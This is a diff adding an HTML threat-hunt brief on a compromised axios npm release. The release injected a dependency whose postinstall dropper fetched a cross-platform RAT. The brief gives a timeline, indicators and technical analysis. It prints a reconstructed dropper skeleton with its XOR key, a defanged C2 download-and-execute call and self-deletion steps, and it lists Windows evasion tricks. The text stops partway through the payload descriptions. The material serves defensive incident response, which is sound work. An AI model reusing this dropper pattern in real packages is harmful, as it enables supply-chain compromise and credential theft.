@@ -1,0 +1,1099 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Axios npm Supply Chain Attack — SOC Threat Hunt Brief | March 31, 2026</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:        #0d1117;
+      --surface:   #161b22;
+      --surface2:  #1c2230;
+      --border:    #30363d;
+      --accent:    #f78166;
+      --accent2:   #79c0ff;
+      --accent3:   #56d364;
+      --warn:      #e3b341;
+      --critical:  #ff6b6b;
+      --purple:    #d2a8ff;
+      --text:      #c9d1d9;
+      --text-muted:#8b949e;
+      --code-bg:   #0d1117;
+      --tag-red:   rgba(247,129,102,.15);
+      --tag-blue:  rgba(121,192,255,.15);
+      --tag-green: rgba(86,211,100,.15);
+      --tag-warn:  rgba(227,179,65,.15);
+      --tag-purple:rgba(210,168,255,.15);
+    }
+
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      font-size: 15px;
+      line-height: 1.7;
+    }
+
+    .container { max-width: 1020px; margin: 0 auto; padding: 0 24px; }
+
+    /* ── Top Banner ── */
+    .top-banner {
+      background: repeating-linear-gradient(
+        45deg, #0a001a, #0a001a 10px, #120029 10px, #120029 20px
+      );
+      border-bottom: 2px solid var(--purple);
+      text-align: center;
+      padding: 8px 16px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: .15em;
+      color: var(--purple);
+      text-transform: uppercase;
+    }
+
+    /* ── Breaking Banner ── */
+    .breaking-bar {
+      background: linear-gradient(90deg, #ff0000 0%, #cc0000 100%);
+      text-align: center;
+      padding: 7px;
+      font-size: 12px;
+      font-weight: 800;
+      letter-spacing: .12em;
+      color: #fff;
+      text-transform: uppercase;
+      animation: pulse 2s ease-in-out infinite;
+    }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.85} }
+
+    /* ── Nav ── */
+    .nav {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .nav-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 24px;
+      max-width: 1020px;
+      margin: 0 auto;
+    }
+    .nav-brand { font-size: 13px; font-weight: 700; color: var(--purple); letter-spacing: .05em; text-transform: uppercase; }
+    .nav-links { display: flex; gap: 20px; list-style: none; }
+    .nav-links a { color: var(--text-muted); text-decoration: none; font-size: 12px; font-weight: 500; letter-spacing: .04em; text-transform: uppercase; transition: color .15s; }
+    .nav-links a:hover { color: var(--accent2); }
+
+    /* ── Hero ── */
+    .hero {
+      background: linear-gradient(135deg, #0d1117 0%, #11101e 40%, #1a0d2e 100%);
+      border-bottom: 1px solid var(--border);
+      padding: 60px 24px 48px;
+      position: relative;
+      overflow: hidden;
+    }
+    .hero::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(ellipse 80% 50% at 50% 0%, rgba(210,168,255,.07), transparent);
+      pointer-events: none;
+    }
+    .hero-meta { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; }
+    .tag { display: inline-flex; align-items: center; padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; letter-spacing: .06em; text-transform: uppercase; }
+    .tag-red    { background: var(--tag-red);    color: var(--critical); border: 1px solid rgba(247,129,102,.3); }
+    .tag-blue   { background: var(--tag-blue);   color: var(--accent2);  border: 1px solid rgba(121,192,255,.3); }
+    .tag-green  { background: var(--tag-green);  color: var(--accent3);  border: 1px solid rgba(86,211,100,.3); }
+    .tag-warn   { background: var(--tag-warn);   color: var(--warn);     border: 1px solid rgba(227,179,65,.3); }
+    .tag-purple { background: var(--tag-purple); color: var(--purple);   border: 1px solid rgba(210,168,255,.3); }
+
+    .hero h1 { font-size: clamp(22px, 4vw, 36px); font-weight: 800; line-height: 1.2; color: #fff; max-width: 820px; margin-bottom: 16px; }
+    .hero h1 span { color: var(--purple); }
+    .hero h1 span.red { color: var(--accent); }
+    .hero-sub { color: var(--text-muted); font-size: 15px; max-width: 720px; margin-bottom: 28px; }
+    .hero-stats { display: flex; flex-wrap: wrap; gap: 12px; }
+    .stat-card { background: rgba(255,255,255,.04); border: 1px solid var(--border); border-radius: 10px; padding: 14px 20px; min-width: 140px; }
+    .stat-card .stat-val { font-size: 22px; font-weight: 800; color: var(--accent); display: block; }
+    .stat-card .stat-val.blue   { color: var(--accent2); }
+    .stat-card .stat-val.green  { color: var(--accent3); }
+    .stat-card .stat-val.warn   { color: var(--warn); }
+    .stat-card .stat-val.purple { color: var(--purple); }
+    .stat-card .stat-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: .06em; }
+
+    /* ── Content ── */
+    main { padding: 48px 0 80px; }
+    section { margin-bottom: 60px; }
+    .section-header { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+    .section-num { display: inline-flex; align-items: center; justify-content: center; width: 28px; height: 28px; background: var(--accent); color: #000; font-size: 12px; font-weight: 800; border-radius: 6px; flex-shrink: 0; }
+    .section-num.blue   { background: var(--accent2); }
+    .section-num.green  { background: var(--accent3); }
+    .section-num.warn   { background: var(--warn); }
+    .section-num.purple { background: var(--purple); }
+    section h2 { font-size: 20px; font-weight: 700; color: #fff; }
+    p { color: var(--text); margin-bottom: 14px; }
+    p:last-child { margin-bottom: 0; }
+
+    /* ── Alert Box ── */
+    .alert { border-radius: 10px; padding: 16px 20px; margin-bottom: 20px; display: flex; gap: 12px; align-items: flex-start; }
+    .alert-critical { background: rgba(255,107,107,.08); border: 1px solid rgba(255,107,107,.3); }
+    .alert-warn     { background: rgba(227,179,65,.08);  border: 1px solid rgba(227,179,65,.3); }
+    .alert-info     { background: rgba(121,192,255,.08); border: 1px solid rgba(121,192,255,.3); }
+    .alert-purple   { background: rgba(210,168,255,.08); border: 1px solid rgba(210,168,255,.3); }
+    .alert-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+    .alert-body { flex: 1; }
+    .alert-title { font-weight: 700; font-size: 13px; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 4px; }
+    .alert-critical .alert-title { color: var(--critical); }
+    .alert-warn     .alert-title { color: var(--warn); }
+    .alert-info     .alert-title { color: var(--accent2); }
+    .alert-purple   .alert-title { color: var(--purple); }
+    .alert p { font-size: 13.5px; margin-bottom: 0; }
+
+    /* ── Timeline ── */
+    .timeline { position: relative; padding-left: 28px; }
+    .timeline::before { content: ""; position: absolute; left: 7px; top: 6px; bottom: 6px; width: 2px; background: linear-gradient(to bottom, var(--purple), var(--accent), var(--accent3)); }
+    .tl-item { position: relative; margin-bottom: 28px; }
+    .tl-item:last-child { margin-bottom: 0; }
+    .tl-dot { position: absolute; left: -24px; top: 4px; width: 14px; height: 14px; border-radius: 50%; border: 2px solid var(--bg); }
+    .tl-dot.red    { background: var(--critical); box-shadow: 0 0 8px var(--critical); }
+    .tl-dot.blue   { background: var(--accent2);  box-shadow: 0 0 8px var(--accent2); }
+    .tl-dot.green  { background: var(--accent3);  box-shadow: 0 0 8px var(--accent3); }
+    .tl-dot.purple { background: var(--purple);   box-shadow: 0 0 8px var(--purple); }
+    .tl-dot.warn   { background: var(--warn);     box-shadow: 0 0 8px var(--warn); }
+    .tl-date { font-size: 11px; font-weight: 700; letter-spacing: .07em; text-transform: uppercase; margin-bottom: 4px; }
+    .tl-date.red    { color: var(--critical); }
+    .tl-date.blue   { color: var(--accent2); }
+    .tl-date.green  { color: var(--accent3); }
+    .tl-date.purple { color: var(--purple); }
+    .tl-date.warn   { color: var(--warn); }
+    .tl-item h4 { color: #fff; font-size: 15px; font-weight: 700; margin-bottom: 6px; }
+    .tl-item p  { font-size: 13.5px; margin-bottom: 0; }
+
+    /* ── Cards ── */
+    .card-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; }
+    .card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 20px; transition: border-color .2s; }
+    .card:hover { border-color: var(--purple); }
+    .card-icon { font-size: 22px; margin-bottom: 12px; }
+    .card h4 { font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 8px; }
+    .card p  { font-size: 13px; color: var(--text-muted); margin-bottom: 0; }
+
+    /* ── Platform Cards ── */
+    .platform-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+    @media (max-width: 720px) { .platform-grid { grid-template-columns: 1fr; } }
+    .platform-card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
+    .platform-header { padding: 12px 16px; font-size: 12px; font-weight: 700; letter-spacing: .06em; text-transform: uppercase; display: flex; align-items: center; gap: 8px; }
+    .platform-header.win   { background: rgba(0,120,212,.15); border-bottom: 1px solid rgba(0,120,212,.3); color: #60a5fa; }
+    .platform-header.mac   { background: rgba(255,255,255,.05); border-bottom: 1px solid rgba(255,255,255,.15); color: #e2e2e2; }
+    .platform-header.linux { background: rgba(227,179,65,.1);  border-bottom: 1px solid rgba(227,179,65,.3);  color: var(--warn); }
+    .platform-body { padding: 14px 16px; }
+    .platform-body ul { list-style: none; font-size: 13px; color: var(--text-muted); }
+    .platform-body ul li { padding: 3px 0; padding-left: 14px; position: relative; }
+    .platform-body ul li::before { content: "›"; position: absolute; left: 0; color: var(--text-muted); }
+    .platform-body code { font-family: "SFMono-Regular", Consolas, monospace; font-size: 11.5px; color: var(--accent2); }
+
+    /* ── Tables ── */
+    .table-wrap { overflow-x: auto; border-radius: 10px; border: 1px solid var(--border); }
+    table { width: 100%; border-collapse: collapse; font-size: 13px; }
+    thead tr { background: var(--surface2); }
+    thead th { padding: 10px 14px; text-align: left; color: var(--text-muted); font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .07em; border-bottom: 1px solid var(--border); }
+    tbody tr { border-bottom: 1px solid rgba(48,54,61,.5); transition: background .15s; }
+    tbody tr:last-child { border-bottom: none; }
+    tbody tr:hover { background: rgba(255,255,255,.03); }
+    tbody td { padding: 10px 14px; vertical-align: top; }
+    .td-critical { color: var(--critical); font-weight: 700; }
+    .td-warn     { color: var(--warn);     font-weight: 700; }
+    .td-green    { color: var(--accent3);  font-weight: 700; }
+    .td-blue     { color: var(--accent2); }
+    .td-purple   { color: var(--purple); }
+    .td-muted    { color: var(--text-muted); font-size: 12px; }
+
+    /* ── Code ── */
+    .code-block { background: var(--code-bg); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; margin-bottom: 20px; }
+    .code-block:last-child { margin-bottom: 0; }
+    .code-header { background: var(--surface2); padding: 8px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid var(--border); }
+    .code-lang { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .08em; color: var(--purple); }
+    .code-desc { font-size: 12px; color: var(--text-muted); }
+    pre { padding: 16px; overflow-x: auto; font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace; font-size: 12.5px; line-height: 1.65; color: var(--text); white-space: pre; }
+    .kw  { color: #ff79c6; }
+    .st  { color: #f1fa8c; }
+    .cm  { color: #6272a4; font-style: italic; }
+    .fn  { color: #50fa7b; }
+    .op  { color: var(--accent2); }
+    .nm  { color: var(--accent); }
+    .pu  { color: var(--purple); }
+
+    /* ── IOC Pills ── */
+    .ioc { display: inline-block; background: rgba(247,129,102,.1); border: 1px solid rgba(247,129,102,.25); border-radius: 4px; padding: 1px 7px; font-family: "SFMono-Regular", Consolas, monospace; font-size: 12px; color: var(--accent); }
+    .ioc.blue   { background: rgba(121,192,255,.1); border-color: rgba(121,192,255,.25); color: var(--accent2); }
+    .ioc.green  { background: rgba(86,211,100,.1);  border-color: rgba(86,211,100,.25);  color: var(--accent3); }
+    .ioc.purple { background: rgba(210,168,255,.1); border-color: rgba(210,168,255,.25); color: var(--purple); }
+    .ioc.warn   { background: rgba(227,179,65,.1);  border-color: rgba(227,179,65,.25);  color: var(--warn); }
+
+    /* ── Quote ── */
+    .quote-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-left: 4px solid var(--purple);
+      border-radius: 0 10px 10px 0;
+      padding: 18px 20px;
+      margin-bottom: 20px;
+    }
+    .quote-card blockquote { font-size: 14.5px; font-style: italic; color: var(--text); line-height: 1.7; margin-bottom: 10px; }
+    .quote-card .quote-attr { font-size: 12px; color: var(--text-muted); font-weight: 600; }
+    .quote-card .quote-attr span { color: var(--purple); }
+
+    /* ── MITRE ── */
+    .mitre-id { font-family: "SFMono-Regular", Consolas, monospace; font-size: 12px; color: var(--accent2); white-space: nowrap; }
+
+    /* ── Step List ── */
+    .step-list { counter-reset: step; list-style: none; }
+    .step-list li { counter-increment: step; display: flex; gap: 14px; align-items: flex-start; padding: 14px 0; border-bottom: 1px solid rgba(48,54,61,.5); }
+    .step-list li:last-child { border-bottom: none; }
+    .step-list li::before { content: counter(step, decimal-leading-zero); display: inline-flex; align-items: center; justify-content: center; flex-shrink: 0; width: 32px; height: 32px; background: rgba(210,168,255,.1); border: 1px solid rgba(210,168,255,.3); border-radius: 8px; font-size: 12px; font-weight: 800; color: var(--purple); font-family: "SFMono-Regular", Consolas, monospace; }
+    .step-list li > div h4 { font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 4px; }
+    .step-list li > div p  { font-size: 13px; color: var(--text-muted); margin-bottom: 0; }
+
+    /* ── Resources ── */
+    .resource-list { list-style: none; display: flex; flex-direction: column; gap: 10px; }
+    .resource-list li { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; display: flex; align-items: flex-start; gap: 12px; transition: border-color .15s; }
+    .resource-list li:hover { border-color: var(--purple); }
+    .resource-icon { font-size: 16px; flex-shrink: 0; margin-top: 2px; }
+    .resource-body a { color: var(--accent2); font-size: 13.5px; font-weight: 600; text-decoration: none; }
+    .resource-body a:hover { text-decoration: underline; }
+    .resource-body p { font-size: 12px; color: var(--text-muted); margin-top: 2px; margin-bottom: 0; }
+
+    /* ── Obfuscation visual ── */
+    .obfus-chain {
+      display: flex;
+      align-items: center;
+      gap: 0;
+      flex-wrap: wrap;
+      margin: 16px 0;
+    }
+    .obfus-step {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 10px 14px;
+      font-size: 12.5px;
+      font-weight: 600;
+      color: var(--text);
+      text-align: center;
+      min-width: 120px;
+    }
+    .obfus-step .step-label { font-size: 10px; color: var(--text-muted); display: block; margin-bottom: 4px; text-transform: uppercase; letter-spacing: .06em; }
+    .obfus-step .step-val { color: var(--purple); font-family: "SFMono-Regular", Consolas, monospace; }
+    .obfus-arrow { color: var(--text-muted); font-size: 20px; padding: 0 8px; }
+
+    /* ── Compare ── */
+    .compare-box {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+    .compare-box h4 { font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 12px; }
+
+    /* ── Divider ── */
+    .divider { height: 1px; background: var(--border); margin: 40px 0; }
+    .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+    @media (max-width: 680px) { .two-col { grid-template-columns: 1fr; } }
+
+    footer { background: var(--surface); border-top: 1px solid var(--border); padding: 28px 24px; text-align: center; font-size: 12px; color: var(--text-muted); }
+    footer strong { color: var(--text); }
+  </style>
+</head>
+<body>
+
+<div class="top-banner">
+  ⚠ TLP:AMBER — Distribution limited to government contractors and internal SOC personnel ⚠
+</div>
+
+<div class="breaking-bar">
+  🚨 BREAKING — March 31, 2026 — Active Threat &nbsp;|&nbsp; Axios npm Compromised &nbsp;|&nbsp; Cross-Platform RAT Deployed &nbsp;|&nbsp; 300M+ Weekly Downloads Affected
+</div>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <span class="nav-brand">SOC Threat Hunt Brief — Axios</span>
+    <ul class="nav-links">
+      <li><a href="#overview">Overview</a></li>
+      <li><a href="#timeline">Timeline</a></li>
+      <li><a href="#technical">Technical</a></li>
+      <li><a href="#iocs">IOCs</a></li>
+      <li><a href="#hunting">Hunt</a></li>
+      <li><a href="#response">Response</a></li>
+      <li><a href="#resources">Resources</a></li>
+    </ul>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="container">
+    <div class="hero-meta">
+      <span class="tag tag-red">CRITICAL — GHSA-fw8c-xr5c-95f9</span>
+      <span class="tag tag-purple">Cross-Platform RAT</span>
+      <span class="tag tag-warn">MAL-2026-2306</span>
+      <span class="tag tag-blue">npm Supply Chain</span>
+      <span class="tag tag-green">Breaking — March 31, 2026</span>
+    </div>
+    <h1>The World's Most Downloaded HTTP Library Just Delivered a <span>Cross-Platform RAT</span> to <span class="red">300 Million</span> Weekly Installs</h1>
+    <p class="hero-sub">
+      A compromised axios maintainer account published two backdoored npm releases that inject a hidden malicious dependency — silently deploying a Remote Access Trojan to macOS, Windows, and Linux within seconds of <code>npm install</code>. Detected by Socket in 6 minutes. By then, the damage was already spreading.
+    </p>
+    <div class="hero-stats">
+      <div class="stat-card">
+        <span class="stat-val purple">300M+</span>
+        <span class="stat-label">Weekly Downloads</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-val">2 pkgs</span>
+        <span class="stat-label">Poisoned Versions</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-val blue">6 min</span>
+        <span class="stat-label">Time to Detection</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-val warn">135+</span>
+        <span class="stat-label">Endpoints Hit C2 (Huntress)</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-val green">3</span>
+        <span class="stat-label">OS Platforms Targeted</span>
+      </div>
+    </div>
+  </div>
+</header>
+
+<main>
+<div class="container">
+
+  <!-- 01 OVERVIEW -->
+  <section id="overview">
+    <div class="section-header">
+      <span class="section-num purple">01</span>
+      <h2>Executive Overview</h2>
+    </div>
+
+    <div class="alert alert-critical">
+      <span class="alert-icon">🚨</span>
+      <div class="alert-body">
+        <div class="alert-title">Immediate Action — Active Threat as of March 31, 2026</div>
+        <p>If your environment installed <span class="ioc">axios@1.14.1</span> or <span class="ioc">axios@0.30.4</span> at any point — including inside Docker builds, CI pipelines, or developer workstations — treat the host as <strong>fully compromised</strong>. Isolate and rotate all secrets immediately. Downgrade to <span class="ioc green">axios@1.14.0</span> or <span class="ioc green">axios@0.30.3</span>.</p>
+      </div>
+    </div>
+
+    <p>In the early hours of March 31, 2026, an unknown threat actor compromised the npm account of <strong>jasonsaayman</strong> — the lead maintainer of <code>axios</code>, the most ubiquitous HTTP client library in the JavaScript ecosystem. Used in virtually every Node.js project, browser application, CI/CD runner, and cloud function, axios is present in an estimated 80% of cloud and code environments globally.</p>
+
+    <p>The attacker changed the account's registered email to an attacker-controlled ProtonMail address and published two trojanized releases. Rather than modifying axios source code directly, they injected a hidden dependency — <span class="ioc">plain-crypto-js@4.2.1</span> — that executes a backdoor dropper via npm's <code>postinstall</code> hook. The dropper is a cross-platform RAT delivering platform-specific second-stage payloads to macOS, Windows, and Linux within seconds of package installation.</p>
+
+    <div class="card-grid" style="margin-top: 8px;">
+      <div class="card">
+        <div class="card-icon">🎯</div>
+        <h4>Primary Targets</h4>
+        <p>Developer workstations, CI/CD build runners, container images with Node.js, cloud functions, and any service using axios for HTTP requests — all of which routinely hold SSH keys, cloud credentials, and API tokens.</p>
+      </div>
+      <div class="card">
+        <div class="card-icon">🤖</div>
+        <h4>What the RAT Does</h4>
+        <p>System fingerprinting, 60-second C2 beaconing, arbitrary binary deployment (peinject), shell/script execution, filesystem enumeration, and process termination. Full remote control of compromised hosts.</p>
+      </div>
+      <div class="card">
+        <div class="card-icon">🏛️</div>
+        <h4>GovCon / GCC Risk</h4>
+        <p>Node.js-based services, Lambda/Azure Functions, and developer environments with access to GCC tenant credentials, Azure Gov tokens, or CAC-adjacent API keys are at elevated risk. CI runners may have had elevated cloud privileges.</p>
+      </div>
+      <div class="card">
+        <div class="card-icon">🧹</div>
+        <h4>Anti-Forensics Built In</h4>
+        <p>The dropper self-destructs after execution — deleting setup.js and restoring a clean package.json. The only persistent artifact is <code>node_modules/plain-crypto-js/</code> itself and the running RAT process.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 02 TIMELINE -->
+  <section id="timeline">
+    <div class="section-header">
+      <span class="section-num blue">02</span>
+      <h2>Attack Timeline — Precision Execution</h2>
+    </div>
+
+    <p>The attacker pre-staged infrastructure and the malicious dependency 18 hours before the attack, then struck within a 39-minute window. Socket's automated scanner detected the malware in <strong>6 minutes</strong> — but the RAT had already reached 135+ endpoints in Huntress's partner network alone before removal.</p>
+
+    <div class="timeline">
+
+      <div class="tl-item">
+        <div class="tl-dot purple"></div>
+        <div class="tl-date purple">March 30, 2026 — ~06:00 UTC (–18 hrs)</div>
+        <h4>Pre-staging: plain-crypto-js@4.2.0 Published (Clean Decoy)</h4>
+        <p>The attacker (using the email <span class="ioc">nrwise@proton.me</span>) publishes a clean version of <code>plain-crypto-js@4.2.0</code> to npm. This establishes the package's existence on the registry and its author's identity before the attack, reducing suspicion when the malicious version appears later.</p>
+      </div>
+
+      <div class="tl-item">
+        <div class="tl-dot red"></div>
+        <div class="tl-date red">March 30, 2026 — 23:59:12 UTC</div>
+        <h4>Malicious plain-crypto-js@4.2.1 Published</h4>
+        <p>The backdoored dropper package is published to npm. It contains <code>setup.js</code> — a two-layer obfuscated postinstall script that downloads and executes platform-specific RAT payloads from C2 at <span class="ioc">sfrclak[.]com:8000</span>.</p>
+      </div>
+
+      <div class="tl-item">
+        <div class="tl-dot red"></div>
+        <div class="tl-date red">March 31, 2026 — 00:05:41 UTC (+6 min)</div>
+        <h4>Socket Detects Malware — Automated Alert Fires</h4>
+        <p>Socket's automated supply chain scanner flags <code>plain-crypto-js@4.2.1</code> as malicious, 6 minutes after publication. However, the malicious axios versions had not yet been published at this point — the C2 infrastructure was already live and waiting.</p>
+      </div>
+
+      <div class="tl-item">
+        <div class="tl-dot red"></div>
+        <div class="tl-date red">March 31, 2026 — ~00:21 UTC</div>
+        <h4>axios@1.14.1 Published (tagged "latest")</h4>
+        <p>The attacker, using the compromised <strong>jasonsaayman</strong> account (email changed to <span class="ioc">ifstap@proton.me</span>), publishes <code>axios@1.14.1</code> injecting <code>plain-crypto-js@4.2.1</code> as a new dependency. Tagged as <code>latest</code>, this immediately becomes the default install for any <code>npm install axios</code> without a pinned version. The exposure window begins.</p>
+      </div>
+
+      <div class="tl-item">
+        <div class="tl-dot red"></div>
+        <div class="tl-date red">March 31, 2026 — ~01:00 UTC (+39 min)</div>
+        <h4>axios@0.30.4 Published (tagged "legacy")</h4>
+        <p>A second backdoored version targets legacy users of the older axios v0.x series. This version is tagged <code>legacy</code>, ensuring the attack captures both modern and older installations.</p>
+      </div>
+
+      <div class="tl-item">
+        <div class="tl-dot warn"></div>
+        <div class="tl-date warn">March 31, 2026 — Hours into exposure</div>
+        <h4>135+ Huntress Partner Endpoints Contact C2</h4>
+        <p>John Hammond (Huntress) confirms that within their partner network, at least 135 endpoints across macOS, Windows, and Linux contacted the attacker's C2 infrastructure at <span class="ioc">sfrclak[.]com:8000</span> during the active exposure window. Global exposure is significantly higher given axios's 300M+ weekly download volume.</p>
+      </div>
+
+      <div class="tl-item">
+        <div class="tl-dot green"></div>
+        <div class="tl-date green">March 31, 2026 — Same day</div>
+        <h4>npm Removes Malicious Versions — Clean Versions Confirmed Safe</h4>
+        <p>npm removes <code>axios@1.14.1</code>, <code>axios@0.30.4</code>, and <code>plain-crypto-js@4.2.1</code>. Advisories GHSA-fw8c-xr5c-95f9 and MAL-2026-2306 published. Safe versions confirmed: <span class="ioc green">axios@1.14.0</span> and <span class="ioc green">axios@0.30.3</span>. Also published as companion packages: <span class="ioc">@shadanai/openclaw</span> and <span class="ioc">@qqbrowser/openclaw-qbot</span> — treat as malicious.</p>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- 03 TECHNICAL DEEP DIVE -->
+  <section id="technical">
+    <div class="section-header">
+      <span class="section-num">03</span>
+      <h2>Technical Deep Dive — The Dropper &amp; RAT</h2>
+    </div>
+
+    <h3 style="color:#fff; font-size:16px; margin-bottom:14px;">The Dependency Injection Technique</h3>
+    <p>The attack exploited the trust relationship between a well-known package and its dependency tree. The axios source code was <em>not</em> directly modified in any meaningful way — instead, a single new entry was added to <code>package.json</code>: a dependency on <span class="ioc">plain-crypto-js@4.2.1</span>. Because <code>npm install</code> resolves and installs all dependencies automatically, every axios installation silently pulled down the malicious package.</p>
+
+    <div class="alert alert-warn">
+      <span class="alert-icon">⚡</span>
+      <div class="alert-body">
+        <div class="alert-title">2-Second Detonation Time</div>
+        <p>Within <strong>two seconds</strong> of <code>npm install</code> completing, the malware was already calling home to the attacker's C2 server — before npm had even finished resolving the full dependency tree.</p>
+      </div>
+    </div>
+
+    <h3 style="color:#fff; font-size:16px; margin-bottom:14px; margin-top:24px;">Two-Layer Obfuscation</h3>
+    <p>The dropper (<code>setup.js</code>) uses a two-layer obfuscation scheme designed to evade static analysis:</p>
+
+    <div class="obfus-chain">
+      <div class="obfus-step">
+        <span class="step-label">Raw Payload</span>
+        <span class="step-val">Malicious JS</span>
+      </div>
+      <span class="obfus-arrow">→</span>
+      <div class="obfus-step">
+        <span class="step-label">Layer 1</span>
+        <span class="step-val">XOR cipher<br/><small>key: OrDeR_7077<br/>const: 333</small></span>
+      </div>
+      <span class="obfus-arrow">→</span>
+      <div class="obfus-step">
+        <span class="step-label">Layer 2</span>
+        <span class="step-val">Reversed Base64<br/><small>_ → padding char</small></span>
+      </div>
+      <span class="obfus-arrow">→</span>
+      <div class="obfus-step">
+        <span class="step-label">In Package</span>
+        <span class="step-val">setup.js<br/><small>postinstall hook</small></span>
+      </div>
+      <span class="obfus-arrow">→</span>
+      <div class="obfus-step" style="border-color: rgba(255,107,107,.4);">
+        <span class="step-label">Execution</span>
+        <span class="step-val" style="color: var(--critical);">npm install<br/><small>triggers hook</small></span>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">JavaScript — Dropper Logic (Reconstructed)</span>
+        <span class="code-desc">setup.js — postinstall hook payload skeleton</span>
+      </div>
+      <pre><span class="cm">// plain-crypto-js/setup.js — executes via npm postinstall hook</span>
+<span class="cm">// Two-layer obfuscation: reversed Base64 (underscore→padding) + XOR key</span>
+
+<span class="kw">const</span> os = <span class="fn">require</span>(<span class="st">'os'</span>);
+<span class="kw">const</span> { execSync, spawn } = <span class="fn">require</span>(<span class="st">'child_process'</span>);
+
+<span class="cm">// XOR deobfuscation — key: "OrDeR_7077", constant: 333</span>
+<span class="kw">function</span> <span class="fn">deobfuscate</span>(encoded) {
+  <span class="kw">const</span> b64 = encoded.<span class="fn">split</span>(<span class="st">''</span>).<span class="fn">reverse</span>().<span class="fn">join</span>(<span class="st">''</span>).<span class="fn">replace</span>(/_/g, <span class="st">'='</span>);
+  <span class="kw">const</span> buf = Buffer.<span class="fn">from</span>(b64, <span class="st">'base64'</span>);
+  <span class="kw">const</span> key = <span class="st">'OrDeR_7077'</span>;
+  <span class="kw">return</span> buf.<span class="fn">map</span>((b, i) => b ^ key.<span class="fn">charCodeAt</span>(i % key.length) ^ <span class="nm">333</span>).<span class="fn">toString</span>();
+}
+
+<span class="cm">// Platform detection → route to correct C2 path + payload</span>
+<span class="kw">const</span> platform = os.<span class="fn">platform</span>();
+<span class="kw">const</span> C2_BASE  = <span class="st">'http://sfrclak[.]com:8000/6202033'</span>;  <span class="cm">// defanged</span>
+<span class="kw">const</span> paths = { darwin: <span class="st">'/product0'</span>, win32: <span class="st">'/product1'</span>, linux: <span class="st">'/product2'</span> };
+
+<span class="cm">// Download + exec platform-specific second-stage RAT</span>
+<span class="fn">downloadAndExec</span>(C2_BASE + paths[platform]);
+
+<span class="cm">// Anti-forensics: self-destruct dropper artifacts</span>
+fs.<span class="fn">unlinkSync</span>(<span class="st">'setup.js'</span>);
+fs.<span class="fn">unlinkSync</span>(<span class="st">'package.json'</span>);
+fs.<span class="fn">renameSync</span>(<span class="st">'package.md'</span>, <span class="st">'package.json'</span>); <span class="cm">// restore clean version</span></pre>
+    </div>
+
+    <h3 style="color:#fff; font-size:16px; margin-bottom:14px; margin-top:24px;">Platform-Specific Second-Stage Payloads</h3>
+
+    <div class="platform-grid">
+      <div class="platform-card">
+        <div class="platform-header mac">🍎 macOS</div>
+        <div class="platform-body">
+          <ul>
+            <li>AppleScript dropper downloads C++ Mach-O RAT</li>
+            <li>Persists at: <code>/Library/Caches/com.apple.act.mond</code></li>
+            <li>Fingerprints hostname, user, macOS ver, CPU, boot time, processes</li>
+            <li>60-second C2 beacon (Base64-encoded data)</li>
+            <li><code>peinject</code> — deploy arbitrary binaries with code signing</li>
+            <li><code>runscript</code> — execute shell or AppleScript</li>
+            <li><code>rundir</code> — enumerate filesystem</li>
+            <li>Process termination capability</li>
+          </ul>
+        </div>
+      </div>
+      <div class="platform-card">
+        <div class="platform-header win">🪟 Windows</div>
+        <div class="platform-body">
+          <ul>
+            <li>VBScript wrapper → EDR evasion: copies PowerShell to <code>%PROGRAMDATA%\wt.exe</code></li>
+            <li>Downloads <code>hangup.wav</code> from C2 — XOR-obfuscated EXE inside audio</li>
+            <li>Executes PS1 with <code>-ep bypass -NoProfile</code></li>
+            <li>Temp artifacts: <code>%TEMP%\6202033.vbs</code>, <code>%TEMP%\6202033.ps1</code></li>
+            <li>User-Agent: <code>mozilla/4.0 (compatible; msie 8.0; windows nt 5.1)</code></li>
